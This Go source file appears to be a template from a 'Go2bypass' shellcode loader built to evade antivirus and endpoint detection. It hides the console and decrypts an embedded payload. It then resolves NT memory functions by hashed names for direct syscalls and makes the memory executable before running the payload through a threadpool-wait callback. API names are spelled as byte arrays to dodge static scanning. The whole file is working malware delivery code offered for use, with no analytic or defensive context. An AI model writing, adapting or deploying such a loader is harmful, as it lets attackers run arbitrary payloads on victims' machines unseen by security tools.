package main

import (
	Go2public "Go2bypass/Public"
	"golang.org/x/sys/windows"
	"os"
	_ "embed"
    Go2gabh "Go2bypass/Doge-Gabh/Gabh"
    "fmt"
    "syscall"
    "unsafe"
)

//go:embed CodeToStringShell.txt
var CodeToStringShell string

var ApiDe Go2public.ApiEDcrypt
var CodeEnContent Go2public.CodToshellKey

func main() {
    /******HideConsole******/
	Go2public.Peels()
	CodeEnContent.KeyKey = `/******KeyKey******/`
	CodeEnContent.CodeToStringShell = CodeToStringShell
    /******DecodeType******/
    sc, err := ApiDe.CodeToShellDncrypt(CodeEnContent)
    if err != nil {
    		os.Exit(0)
    }
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    alloc, e := Go2gabh.GetSSNByNameExcept(Go2public.Str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Go2public.Str2sha1)
    if e != nil {
        panic(e)
    }
    protect, e := Go2gabh.GetSSNByNameExcept(Go2public.Sha256Hex(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), Go2public.Sha256Hex)
    if e != nil {
        panic(e)
    }
    const (
        mt = uintptr(0x00001000)
        me = uintptr(0x00002000)
    )

    var handle = uintptr(0xffffffffffffffff)
    var baseA uintptr
    regionsize := uintptr(len(sc))
    r1, r := Go2gabh.HgSyscall(
        uint16(alloc),
        handle,
        uintptr(unsafe.Pointer(&baseA)),
        0,
        uintptr(unsafe.Pointer(&regionsize)),
        uintptr(mt|me),
        syscall.PAGE_READWRITE,
    )
    if r != nil {
        fmt.Printf("1 %s %x\n", r, r1)
        return
    }
    Go2public.Cpymem(baseA, sc)
    var oldprotect uintptr
    r1, r = Go2gabh.HgSyscall(
        uint16(protect),
        handle,
        uintptr(unsafe.Pointer(&baseA)),
        uintptr(unsafe.Pointer(&regionsize)),
        syscall.PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldprotect)),
    )
    if r != nil {
        fmt.Printf("1 %s %x\n", r, r1)
        return
    }
    Ctpw, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "b9965c1becf73a78756827d6177e4884fbad979451957fba174694f846133709", Go2public.Sha256Hex)
    STPDW := kernel32.NewProc("SetThreadpoolWait")
    WFSLO, _, _ := Go2gabh.DiskFuncPtr(string([]byte{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l'}), "6a98c5468e3cd5c8fec2ed81dcfb6c653bfe56289debe0e1089c92dc8eff744f", Go2public.Sha256Hex)
    event, err := windows.CreateEvent(nil, 0, 1, nil)
    if err != nil {
        return
    }
    pool, _, _ := syscall.Syscall(uintptr(Ctpw), 1, baseA, 0, 0)
    STPDW.Call(pool, uintptr(event), 0)
    syscall.Syscall(uintptr(WFSLO), 2, uintptr(event), 0xFFFFFFFF, 0)
}
